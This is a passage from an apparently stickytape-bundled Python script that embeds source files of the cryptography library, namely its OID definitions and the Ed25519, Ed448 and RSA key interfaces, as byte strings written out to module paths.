EllipticCurveOID.SECT571R1: SECT571R1,\r\n}\r\n\r\n\r\ndef get_curve_for_oid(oid: ObjectIdentifier) -> typing.Type[EllipticCurve]:\r\n    try:\r\n        return _OID_TO_CURVE[oid]\r\n    except KeyError:\r\n        raise LookupError(\r\n            "The provided object identifier has no matching elliptic "\r\n            "curve class"\r\n        )\r\n')
    __stickytape_write_module('cryptography/hazmat/_oid.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.hazmat.primitives import hashes\r\n\r\n\r\nclass ObjectIdentifier:\r\n    def __init__(self, dotted_string: str) -> None:\r\n        self._dotted_string = dotted_string\r\n\r\n        nodes = self._dotted_string.split(".")\r\n        intnodes = []\r\n\r\n        # There must be at least 2 nodes, the first node must be 0..2, and\r\n        # if less than 2, the second node cannot have a value outside the\r\n        # range 0..39.  All nodes must be integers.\r\n        for node in nodes:\r\n            try:\r\n                node_value = int(node, 10)\r\n            except ValueError:\r\n                raise ValueError(\r\n                    f"Malformed OID: {dotted_string} (non-integer nodes)"\r\n                )\r\n            if node_value < 0:\r\n                raise ValueError(\r\n                    f"Malformed OID: {dotted_string} (negative-integer nodes)"\r\n                )\r\n            intnodes.append(node_value)\r\n\r\n        if len(nodes) < 2:\r\n            raise ValueError(\r\n                f"Malformed OID: {dotted_string} "\r\n                "(insufficient number of nodes)"\r\n            )\r\n\r\n        if intnodes[0] > 2:\r\n            raise ValueError(\r\n                f"Malformed OID: {dotted_string} "\r\n                "(first node outside valid range)"\r\n            )\r\n\r\n        if intnodes[0] < 2 and intnodes[1] >= 40:\r\n            raise ValueError(\r\n                f"Malformed OID: {dotted_string} "\r\n                "(second node outside valid range)"\r\n            )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, ObjectIdentifier):\r\n            return NotImplemented\r\n\r\n        return self.dotted_string == other.dotted_string\r\n\r\n    def __repr__(self) -> str:\r\n        return "<ObjectIdentifier(oid={}, name={})>".format(\r\n            self.dotted_string, self._name\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self.dotted_string)\r\n\r\n    @property\r\n    def _name(self) -> str:\r\n        return _OID_NAMES.get(self, "Unknown OID")\r\n\r\n    @property\r\n    def dotted_string(self) -> str:\r\n        return self._dotted_string\r\n\r\n\r\nclass ExtensionOID:\r\n    SUBJECT_DIRECTORY_ATTRIBUTES = ObjectIdentifier("2.5.29.9")\r\n    SUBJECT_KEY_IDENTIFIER = ObjectIdentifier("2.5.29.14")\r\n    KEY_USAGE = ObjectIdentifier("2.5.29.15")\r\n    SUBJECT_ALTERNATIVE_NAME = ObjectIdentifier("2.5.29.17")\r\n    ISSUER_ALTERNATIVE_NAME = ObjectIdentifier("2.5.29.18")\r\n    BASIC_CONSTRAINTS = ObjectIdentifier("2.5.29.19")\r\n    NAME_CONSTRAINTS = ObjectIdentifier("2.5.29.30")\r\n    CRL_DISTRIBUTION_POINTS = ObjectIdentifier("2.5.29.31")\r\n    CERTIFICATE_POLICIES = ObjectIdentifier("2.5.29.32")\r\n    POLICY_MAPPINGS = ObjectIdentifier("2.5.29.33")\r\n    AUTHORITY_KEY_IDENTIFIER = ObjectIdentifier("2.5.29.35")\r\n    POLICY_CONSTRAINTS = ObjectIdentifier("2.5.29.36")\r\n    EXTENDED_KEY_USAGE = ObjectIdentifier("2.5.29.37")\r\n    FRESHEST_CRL = ObjectIdentifier("2.5.29.46")\r\n    INHIBIT_ANY_POLICY = ObjectIdentifier("2.5.29.54")\r\n    ISSUING_DISTRIBUTION_POINT = ObjectIdentifier("2.5.29.28")\r\n    AUTHORITY_INFORMATION_ACCESS = ObjectIdentifier("1.3.6.1.5.5.7.1.1")\r\n    SUBJECT_INFORMATION_ACCESS = ObjectIdentifier("1.3.6.1.5.5.7.1.11")\r\n    OCSP_NO_CHECK = ObjectIdentifier("1.3.6.1.5.5.7.48.1.5")\r\n    TLS_FEATURE = ObjectIdentifier("1.3.6.1.5.5.7.1.24")\r\n    CRL_NUMBER = ObjectIdentifier("2.5.29.20")\r\n    DELTA_CRL_INDICATOR = ObjectIdentifier("2.5.29.27")\r\n    PRECERT_SIGNED_CERTIFICATE_TIMESTAMPS = ObjectIdentifier(\r\n        "1.3.6.1.4.1.11129.2.4.2"\r\n    )\r\n    PRECERT_POISON = ObjectIdentifier("1.3.6.1.4.1.11129.2.4.3")\r\n    SIGNED_CERTIFICATE_TIMESTAMPS = ObjectIdentifier("1.3.6.1.4.1.11129.2.4.5")\r\n\r\n\r\nclass OCSPExtensionOID:\r\n    NONCE = ObjectIdentifier("1.3.6.1.5.5.7.48.1.2")\r\n\r\n\r\nclass CRLEntryExtensionOID:\r\n    CERTIFICATE_ISSUER = ObjectIdentifier("2.5.29.29")\r\n    CRL_REASON = ObjectIdentifier("2.5.29.21")\r\n    INVALIDITY_DATE = ObjectIdentifier("2.5.29.24")\r\n\r\n\r\nclass NameOID:\r\n    COMMON_NAME = ObjectIdentifier("2.5.4.3")\r\n    COUNTRY_NAME = ObjectIdentifier("2.5.4.6")\r\n    LOCALITY_NAME = ObjectIdentifier("2.5.4.7")\r\n    STATE_OR_PROVINCE_NAME = ObjectIdentifier("2.5.4.8")\r\n    STREET_ADDRESS = ObjectIdentifier("2.5.4.9")\r\n    ORGANIZATION_NAME = ObjectIdentifier("2.5.4.10")\r\n    ORGANIZATIONAL_UNIT_NAME = ObjectIdentifier("2.5.4.11")\r\n    SERIAL_NUMBER = ObjectIdentifier("2.5.4.5")\r\n    SURNAME = ObjectIdentifier("2.5.4.4")\r\n    GIVEN_NAME = ObjectIdentifier("2.5.4.42")\r\n    TITLE = ObjectIdentifier("2.5.4.12")\r\n    GENERATION_QUALIFIER = ObjectIdentifier("2.5.4.44")\r\n    X500_UNIQUE_IDENTIFIER = ObjectIdentifier("2.5.4.45")\r\n    DN_QUALIFIER = ObjectIdentifier("2.5.4.46")\r\n    PSEUDONYM = ObjectIdentifier("2.5.4.65")\r\n    USER_ID = ObjectIdentifier("0.9.2342.19200300.100.1.1")\r\n    DOMAIN_COMPONENT = ObjectIdentifier("0.9.2342.19200300.100.1.25")\r\n    EMAIL_ADDRESS = ObjectIdentifier("1.2.840.113549.1.9.1")\r\n    JURISDICTION_COUNTRY_NAME = ObjectIdentifier("1.3.6.1.4.1.311.60.2.1.3")\r\n    JURISDICTION_LOCALITY_NAME = ObjectIdentifier("1.3.6.1.4.1.311.60.2.1.1")\r\n    JURISDICTION_STATE_OR_PROVINCE_NAME = ObjectIdentifier(\r\n        "1.3.6.1.4.1.311.60.2.1.2"\r\n    )\r\n    BUSINESS_CATEGORY = ObjectIdentifier("2.5.4.15")\r\n    POSTAL_ADDRESS = ObjectIdentifier("2.5.4.16")\r\n    POSTAL_CODE = ObjectIdentifier("2.5.4.17")\r\n    INN = ObjectIdentifier("1.2.643.3.131.1.1")\r\n    OGRN = ObjectIdentifier("1.2.643.100.1")\r\n    SNILS = ObjectIdentifier("1.2.643.100.3")\r\n    UNSTRUCTURED_NAME = ObjectIdentifier("1.2.840.113549.1.9.2")\r\n\r\n\r\nclass SignatureAlgorithmOID:\r\n    RSA_WITH_MD5 = ObjectIdentifier("1.2.840.113549.1.1.4")\r\n    RSA_WITH_SHA1 = ObjectIdentifier("1.2.840.113549.1.1.5")\r\n    # This is an alternate OID for RSA with SHA1 that is occasionally seen\r\n    _RSA_WITH_SHA1 = ObjectIdentifier("1.3.14.3.2.29")\r\n    RSA_WITH_SHA224 = ObjectIdentifier("1.2.840.113549.1.1.14")\r\n    RSA_WITH_SHA256 = ObjectIdentifier("1.2.840.113549.1.1.11")\r\n    RSA_WITH_SHA384 = ObjectIdentifier("1.2.840.113549.1.1.12")\r\n    RSA_WITH_SHA512 = ObjectIdentifier("1.2.840.113549.1.1.13")\r\n    RSA_WITH_SHA3_224 = ObjectIdentifier("2.16.840.1.101.3.4.3.13")\r\n    RSA_WITH_SHA3_256 = ObjectIdentifier("2.16.840.1.101.3.4.3.14")\r\n    RSA_WITH_SHA3_384 = ObjectIdentifier("2.16.840.1.101.3.4.3.15")\r\n    RSA_WITH_SHA3_512 = ObjectIdentifier("2.16.840.1.101.3.4.3.16")\r\n    RSASSA_PSS = ObjectIdentifier("1.2.840.113549.1.1.10")\r\n    ECDSA_WITH_SHA1 = ObjectIdentifier("1.2.840.10045.4.1")\r\n    ECDSA_WITH_SHA224 = ObjectIdentifier("1.2.840.10045.4.3.1")\r\n    ECDSA_WITH_SHA256 = ObjectIdentifier("1.2.840.10045.4.3.2")\r\n    ECDSA_WITH_SHA384 = ObjectIdentifier("1.2.840.10045.4.3.3")\r\n    ECDSA_WITH_SHA512 = ObjectIdentifier("1.2.840.10045.4.3.4")\r\n    ECDSA_WITH_SHA3_224 = ObjectIdentifier("2.16.840.1.101.3.4.3.9")\r\n    ECDSA_WITH_SHA3_256 = ObjectIdentifier("2.16.840.1.101.3.4.3.10")\r\n    ECDSA_WITH_SHA3_384 = ObjectIdentifier("2.16.840.1.101.3.4.3.11")\r\n    ECDSA_WITH_SHA3_512 = ObjectIdentifier("2.16.840.1.101.3.4.3.12")\r\n    DSA_WITH_SHA1 = ObjectIdentifier("1.2.840.10040.4.3")\r\n    DSA_WITH_SHA224 = ObjectIdentifier("2.16.840.1.101.3.4.3.1")\r\n    DSA_WITH_SHA256 = ObjectIdentifier("2.16.840.1.101.3.4.3.2")\r\n    DSA_WITH_SHA384 = ObjectIdentifier("2.16.840.1.101.3.4.3.3")\r\n    DSA_WITH_SHA512 = ObjectIdentifier("2.16.840.1.101.3.4.3.4")\r\n    ED25519 = ObjectIdentifier("1.3.101.112")\r\n    ED448 = ObjectIdentifier("1.3.101.113")\r\n    GOSTR3411_94_WITH_3410_2001 = ObjectIdentifier("1.2.643.2.2.3")\r\n    GOSTR3410_2012_WITH_3411_2012_256 = ObjectIdentifier("1.2.643.7.1.1.3.2")\r\n    GOSTR3410_2012_WITH_3411_2012_512 = ObjectIdentifier("1.2.643.7.1.1.3.3")\r\n\r\n\r\n_SIG_OIDS_TO_HASH: typing.Dict[\r\n    ObjectIdentifier, typing.Optional[hashes.HashAlgorithm]\r\n] = {\r\n    SignatureAlgorithmOID.RSA_WITH_MD5: hashes.MD5(),\r\n    SignatureAlgorithmOID.RSA_WITH_SHA1: hashes.SHA1(),\r\n    SignatureAlgorithmOID._RSA_WITH_SHA1: hashes.SHA1(),\r\n    SignatureAlgorithmOID.RSA_WITH_SHA224: hashes.SHA224(),\r\n    SignatureAlgorithmOID.RSA_WITH_SHA256: hashes.SHA256(),\r\n    SignatureAlgorithmOID.RSA_WITH_SHA384: hashes.SHA384(),\r\n    SignatureAlgorithmOID.RSA_WITH_SHA512: hashes.SHA512(),\r\n    SignatureAlgorithmOID.ECDSA_WITH_SHA1: hashes.SHA1(),\r\n    SignatureAlgorithmOID.ECDSA_WITH_SHA224: hashes.SHA224(),\r\n    SignatureAlgorithmOID.ECDSA_WITH_SHA256: hashes.SHA256(),\r\n    SignatureAlgorithmOID.ECDSA_WITH_SHA384: hashes.SHA384(),\r\n    SignatureAlgorithmOID.ECDSA_WITH_SHA512: hashes.SHA512(),\r\n    SignatureAlgorithmOID.DSA_WITH_SHA1: hashes.SHA1(),\r\n    SignatureAlgorithmOID.DSA_WITH_SHA224: hashes.SHA224(),\r\n    SignatureAlgorithmOID.DSA_WITH_SHA256: hashes.SHA256(),\r\n    SignatureAlgorithmOID.ED25519: None,\r\n    SignatureAlgorithmOID.ED448: None,\r\n    SignatureAlgorithmOID.GOSTR3411_94_WITH_3410_2001: None,\r\n    SignatureAlgorithmOID.GOSTR3410_2012_WITH_3411_2012_256: None,\r\n    SignatureAlgorithmOID.GOSTR3410_2012_WITH_3411_2012_512: None,\r\n}\r\n\r\n\r\nclass ExtendedKeyUsageOID:\r\n    SERVER_AUTH = ObjectIdentifier("1.3.6.1.5.5.7.3.1")\r\n    CLIENT_AUTH = ObjectIdentifier("1.3.6.1.5.5.7.3.2")\r\n    CODE_SIGNING = ObjectIdentifier("1.3.6.1.5.5.7.3.3")\r\n    EMAIL_PROTECTION = ObjectIdentifier("1.3.6.1.5.5.7.3.4")\r\n    TIME_STAMPING = ObjectIdentifier("1.3.6.1.5.5.7.3.8")\r\n    OCSP_SIGNING = ObjectIdentifier("1.3.6.1.5.5.7.3.9")\r\n    ANY_EXTENDED_KEY_USAGE = ObjectIdentifier("2.5.29.37.0")\r\n    SMARTCARD_LOGON = ObjectIdentifier("1.3.6.1.4.1.311.20.2.2")\r\n    KERBEROS_PKINIT_KDC = ObjectIdentifier("1.3.6.1.5.2.3.5")\r\n    IPSEC_IKE = ObjectIdentifier("1.3.6.1.5.5.7.3.17")\r\n\r\n\r\nclass AuthorityInformationAccessOID:\r\n    CA_ISSUERS = ObjectIdentifier("1.3.6.1.5.5.7.48.2")\r\n    OCSP = ObjectIdentifier("1.3.6.1.5.5.7.48.1")\r\n\r\n\r\nclass SubjectInformationAccessOID:\r\n    CA_REPOSITORY = ObjectIdentifier("1.3.6.1.5.5.7.48.5")\r\n\r\n\r\nclass CertificatePoliciesOID:\r\n    CPS_QUALIFIER = ObjectIdentifier("1.3.6.1.5.5.7.2.1")\r\n    CPS_USER_NOTICE = ObjectIdentifier("1.3.6.1.5.5.7.2.2")\r\n    ANY_POLICY = ObjectIdentifier("2.5.29.32.0")\r\n\r\n\r\nclass AttributeOID:\r\n    CHALLENGE_PASSWORD = ObjectIdentifier("1.2.840.113549.1.9.7")\r\n    UNSTRUCTURED_NAME = ObjectIdentifier("1.2.840.113549.1.9.2")\r\n\r\n\r\n_OID_NAMES = {\r\n    NameOID.COMMON_NAME: "commonName",\r\n    NameOID.COUNTRY_NAME: "countryName",\r\n    NameOID.LOCALITY_NAME: "localityName",\r\n    NameOID.STATE_OR_PROVINCE_NAME: "stateOrProvinceName",\r\n    NameOID.STREET_ADDRESS: "streetAddress",\r\n    NameOID.ORGANIZATION_NAME: "organizationName",\r\n    NameOID.ORGANIZATIONAL_UNIT_NAME: "organizationalUnitName",\r\n    NameOID.SERIAL_NUMBER: "serialNumber",\r\n    NameOID.SURNAME: "surname",\r\n    NameOID.GIVEN_NAME: "givenName",\r\n    NameOID.TITLE: "title",\r\n    NameOID.GENERATION_QUALIFIER: "generationQualifier",\r\n    NameOID.X500_UNIQUE_IDENTIFIER: "x500UniqueIdentifier",\r\n    NameOID.DN_QUALIFIER: "dnQualifier",\r\n    NameOID.PSEUDONYM: "pseudonym",\r\n    NameOID.USER_ID: "userID",\r\n    NameOID.DOMAIN_COMPONENT: "domainComponent",\r\n    NameOID.EMAIL_ADDRESS: "emailAddress",\r\n    NameOID.JURISDICTION_COUNTRY_NAME: "jurisdictionCountryName",\r\n    NameOID.JURISDICTION_LOCALITY_NAME: "jurisdictionLocalityName",\r\n    NameOID.JURISDICTION_STATE_OR_PROVINCE_NAME: (\r\n        "jurisdictionStateOrProvinceName"\r\n    ),\r\n    NameOID.BUSINESS_CATEGORY: "businessCategory",\r\n    NameOID.POSTAL_ADDRESS: "postalAddress",\r\n    NameOID.POSTAL_CODE: "postalCode",\r\n    NameOID.INN: "INN",\r\n    NameOID.OGRN: "OGRN",\r\n    NameOID.SNILS: "SNILS",\r\n    NameOID.UNSTRUCTURED_NAME: "unstructuredName",\r\n    SignatureAlgorithmOID.RSA_WITH_MD5: "md5WithRSAEncryption",\r\n    SignatureAlgorithmOID.RSA_WITH_SHA1: "sha1WithRSAEncryption",\r\n    SignatureAlgorithmOID.RSA_WITH_SHA224: "sha224WithRSAEncryption",\r\n    SignatureAlgorithmOID.RSA_WITH_SHA256: "sha256WithRSAEncryption",\r\n    SignatureAlgorithmOID.RSA_WITH_SHA384: "sha384WithRSAEncryption",\r\n    SignatureAlgorithmOID.RSA_WITH_SHA512: "sha512WithRSAEncryption",\r\n    SignatureAlgorithmOID.RSASSA_PSS: "RSASSA-PSS",\r\n    SignatureAlgorithmOID.ECDSA_WITH_SHA1: "ecdsa-with-SHA1",\r\n    SignatureAlgorithmOID.ECDSA_WITH_SHA224: "ecdsa-with-SHA224",\r\n    SignatureAlgorithmOID.ECDSA_WITH_SHA256: "ecdsa-with-SHA256",\r\n    SignatureAlgorithmOID.ECDSA_WITH_SHA384: "ecdsa-with-SHA384",\r\n    SignatureAlgorithmOID.ECDSA_WITH_SHA512: "ecdsa-with-SHA512",\r\n    SignatureAlgorithmOID.DSA_WITH_SHA1: "dsa-with-sha1",\r\n    SignatureAlgorithmOID.DSA_WITH_SHA224: "dsa-with-sha224",\r\n    SignatureAlgorithmOID.DSA_WITH_SHA256: "dsa-with-sha256",\r\n    SignatureAlgorithmOID.ED25519: "ed25519",\r\n    SignatureAlgorithmOID.ED448: "ed448",\r\n    SignatureAlgorithmOID.GOSTR3411_94_WITH_3410_2001: (\r\n        "GOST R 34.11-94 with GOST R 34.10-2001"\r\n    ),\r\n    SignatureAlgorithmOID.GOSTR3410_2012_WITH_3411_2012_256: (\r\n        "GOST R 34.10-2012 with GOST R 34.11-2012 (256 bit)"\r\n    ),\r\n    SignatureAlgorithmOID.GOSTR3410_2012_WITH_3411_2012_512: (\r\n        "GOST R 34.10-2012 with GOST R 34.11-2012 (512 bit)"\r\n    ),\r\n    ExtendedKeyUsageOID.SERVER_AUTH: "serverAuth",\r\n    ExtendedKeyUsageOID.CLIENT_AUTH: "clientAuth",\r\n    ExtendedKeyUsageOID.CODE_SIGNING: "codeSigning",\r\n    ExtendedKeyUsageOID.EMAIL_PROTECTION: "emailProtection",\r\n    ExtendedKeyUsageOID.TIME_STAMPING: "timeStamping",\r\n    ExtendedKeyUsageOID.OCSP_SIGNING: "OCSPSigning",\r\n    ExtendedKeyUsageOID.SMARTCARD_LOGON: "msSmartcardLogin",\r\n    ExtendedKeyUsageOID.KERBEROS_PKINIT_KDC: "pkInitKDC",\r\n    ExtensionOID.SUBJECT_DIRECTORY_ATTRIBUTES: "subjectDirectoryAttributes",\r\n    ExtensionOID.SUBJECT_KEY_IDENTIFIER: "subjectKeyIdentifier",\r\n    ExtensionOID.KEY_USAGE: "keyUsage",\r\n    ExtensionOID.SUBJECT_ALTERNATIVE_NAME: "subjectAltName",\r\n    ExtensionOID.ISSUER_ALTERNATIVE_NAME: "issuerAltName",\r\n    ExtensionOID.BASIC_CONSTRAINTS: "basicConstraints",\r\n    ExtensionOID.PRECERT_SIGNED_CERTIFICATE_TIMESTAMPS: (\r\n        "signedCertificateTimestampList"\r\n    ),\r\n    ExtensionOID.SIGNED_CERTIFICATE_TIMESTAMPS: (\r\n        "signedCertificateTimestampList"\r\n    ),\r\n    ExtensionOID.PRECERT_POISON: "ctPoison",\r\n    CRLEntryExtensionOID.CRL_REASON: "cRLReason",\r\n    CRLEntryExtensionOID.INVALIDITY_DATE: "invalidityDate",\r\n    CRLEntryExtensionOID.CERTIFICATE_ISSUER: "certificateIssuer",\r\n    ExtensionOID.NAME_CONSTRAINTS: "nameConstraints",\r\n    ExtensionOID.CRL_DISTRIBUTION_POINTS: "cRLDistributionPoints",\r\n    ExtensionOID.CERTIFICATE_POLICIES: "certificatePolicies",\r\n    ExtensionOID.POLICY_MAPPINGS: "policyMappings",\r\n    ExtensionOID.AUTHORITY_KEY_IDENTIFIER: "authorityKeyIdentifier",\r\n    ExtensionOID.POLICY_CONSTRAINTS: "policyConstraints",\r\n    ExtensionOID.EXTENDED_KEY_USAGE: "extendedKeyUsage",\r\n    ExtensionOID.FRESHEST_CRL: "freshestCRL",\r\n    ExtensionOID.INHIBIT_ANY_POLICY: "inhibitAnyPolicy",\r\n    ExtensionOID.ISSUING_DISTRIBUTION_POINT: ("issuingDistributionPoint"),\r\n    ExtensionOID.AUTHORITY_INFORMATION_ACCESS: "authorityInfoAccess",\r\n    ExtensionOID.SUBJECT_INFORMATION_ACCESS: "subjectInfoAccess",\r\n    ExtensionOID.OCSP_NO_CHECK: "OCSPNoCheck",\r\n    ExtensionOID.CRL_NUMBER: "cRLNumber",\r\n    ExtensionOID.DELTA_CRL_INDICATOR: "deltaCRLIndicator",\r\n    ExtensionOID.TLS_FEATURE: "TLSFeature",\r\n    AuthorityInformationAccessOID.OCSP: "OCSP",\r\n    AuthorityInformationAccessOID.CA_ISSUERS: "caIssuers",\r\n    SubjectInformationAccessOID.CA_REPOSITORY: "caRepository",\r\n    CertificatePoliciesOID.CPS_QUALIFIER: "id-qt-cps",\r\n    CertificatePoliciesOID.CPS_USER_NOTICE: "id-qt-unotice",\r\n    OCSPExtensionOID.NONCE: "OCSPNonce",\r\n    AttributeOID.CHALLENGE_PASSWORD: "challengePassword",\r\n}\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/ed25519.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\n\r\nfrom cryptography.exceptions import UnsupportedAlgorithm, _Reasons\r\nfrom cryptography.hazmat.primitives import _serialization\r\n\r\n\r\n_ED25519_KEY_SIZE = 32\r\n_ED25519_SIG_SIZE = 64\r\n\r\n\r\nclass Ed25519PublicKey(metaclass=abc.ABCMeta):\r\n    @classmethod\r\n    def from_public_bytes(cls, data: bytes) -> "Ed25519PublicKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.ed25519_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "ed25519 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_PUBLIC_KEY_ALGORITHM,\r\n            )\r\n\r\n        return backend.ed25519_load_public_bytes(data)\r\n\r\n    @abc.abstractmethod\r\n    def public_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PublicFormat,\r\n    ) -> bytes:\r\n        """\r\n        The serialized bytes of the public key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def verify(self, signature: bytes, data: bytes) -> None:\r\n        """\r\n        Verify the signature.\r\n        """\r\n\r\n\r\nclass Ed25519PrivateKey(metaclass=abc.ABCMeta):\r\n    @classmethod\r\n    def generate(cls) -> "Ed25519PrivateKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.ed25519_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "ed25519 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_PUBLIC_KEY_ALGORITHM,\r\n            )\r\n\r\n        return backend.ed25519_generate_key()\r\n\r\n    @classmethod\r\n    def from_private_bytes(cls, data: bytes) -> "Ed25519PrivateKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.ed25519_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "ed25519 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_PUBLIC_KEY_ALGORITHM,\r\n            )\r\n\r\n        return backend.ed25519_load_private_bytes(data)\r\n\r\n    @abc.abstractmethod\r\n    def public_key(self) -> Ed25519PublicKey:\r\n        """\r\n        The Ed25519PublicKey derived from the private key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PrivateFormat,\r\n        encryption_algorithm: _serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        """\r\n        The serialized bytes of the private key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def sign(self, data: bytes) -> bytes:\r\n        """\r\n        Signs the data.\r\n        """\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/ed448.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\n\r\nfrom cryptography.exceptions import UnsupportedAlgorithm, _Reasons\r\nfrom cryptography.hazmat.primitives import _serialization\r\n\r\n\r\nclass Ed448PublicKey(metaclass=abc.ABCMeta):\r\n    @classmethod\r\n    def from_public_bytes(cls, data: bytes) -> "Ed448PublicKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.ed448_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "ed448 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_PUBLIC_KEY_ALGORITHM,\r\n            )\r\n\r\n        return backend.ed448_load_public_bytes(data)\r\n\r\n    @abc.abstractmethod\r\n    def public_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PublicFormat,\r\n    ) -> bytes:\r\n        """\r\n        The serialized bytes of the public key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def verify(self, signature: bytes, data: bytes) -> None:\r\n        """\r\n        Verify the signature.\r\n        """\r\n\r\n\r\nclass Ed448PrivateKey(metaclass=abc.ABCMeta):\r\n    @classmethod\r\n    def generate(cls) -> "Ed448PrivateKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.ed448_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "ed448 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_PUBLIC_KEY_ALGORITHM,\r\n            )\r\n        return backend.ed448_generate_key()\r\n\r\n    @classmethod\r\n    def from_private_bytes(cls, data: bytes) -> "Ed448PrivateKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.ed448_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "ed448 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_PUBLIC_KEY_ALGORITHM,\r\n            )\r\n\r\n        return backend.ed448_load_private_bytes(data)\r\n\r\n    @abc.abstractmethod\r\n    def public_key(self) -> Ed448PublicKey:\r\n        """\r\n        The Ed448PublicKey derived from the private key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def sign(self, data: bytes) -> bytes:\r\n        """\r\n        Signs the data.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PrivateFormat,\r\n        encryption_algorithm: _serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        """\r\n        The serialized bytes of the private key.\r\n        """\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/rsa.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport typing\r\nfrom math import gcd\r\n\r\nfrom cryptography.hazmat.primitives import _serialization, hashes\r\nfrom cryptography.hazmat.primitives._asymmetric import AsymmetricPadding\r\nfrom cryptography.hazmat.primitives.asymmetric import (\r\n    utils as asym_utils,\r\n)\r\n\r\n\r\nclass RSAPrivateKey(metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def decrypt(self, ciphertext: bytes, padding: AsymmetricPadding) -> bytes:\r\n        """\r\n        Decrypts the provided ciphertext.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def key_size(self) -> int:\r\n        """\r\n        The bit length of the public modulus.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_key(self) -> "RSAPublicKey":\r\n        """\r\n        The RSAPublicKey associated with this private key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def sign(\r\n        self,\r\n        data: bytes,\r\n        padding: AsymmetricPadding,\r\n        algorithm: typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm],\r\n    ) -> bytes:\r\n        """\r\n        Signs the data.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_numbers(self) -> "RSAPrivateNumbers":\r\n        """\r\n        Returns an RSAPrivateNumbers.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PrivateFormat,\r\n        encryption_algorithm: _serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        """\r\n        Returns the key serialized as bytes.\r\n        """\r\n\r\n\r\nRSAPrivateKeyWithSerialization = RSAPrivateKey\r\n\r\n\r\nclass RSAPublicKey(metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def encrypt(self, plaintext: bytes, padding: AsymmetricPadding) -> bytes:\r\n        """\r\n        Encrypts the given plaintext.\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def key_size(self) -> int:\r\n        """\r\n        The bit length of the public modulus.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_numbers(self) -> "RSAPublicNumbers":\r\n        """\r\n        Returns an RSAPublicNumbers\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def public_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PublicFormat,\r\n    ) -> bytes:\r\n        """\r\n        Returns the key serialized as bytes.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def verify(\r\n        self,\r\n        signature: bytes,\r\n        data: bytes,\r\n        padding: AsymmetricPadding,\r\n        algorithm: typing.Union[asym_utils.Prehashed, hashes.HashAlgorithm],\r\n    ) -> None:\r\n        """\r\n        Verifies the signature of the data.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def recover_data_from_signature(\r\n        self,\r\n        signature: bytes,\r\n        padding: AsymmetricPadding,\r\n        algorithm: typing.Optional[hashes.HashAlgorithm],\r\n    ) -> bytes:\r\n        """\r\n        Recovers the original data from the signature.\r\n        """\r\n\r\n\r\nRSAPublicKeyWithSerialization = RSAPublicKey\r\n\r\n\r\ndef generate_private_key(\r\n    public_exponent: int,\r\n    key_size: int,\r\n    backend: typing.Any = None,\r\n) -> RSAPrivateKey:\r\n    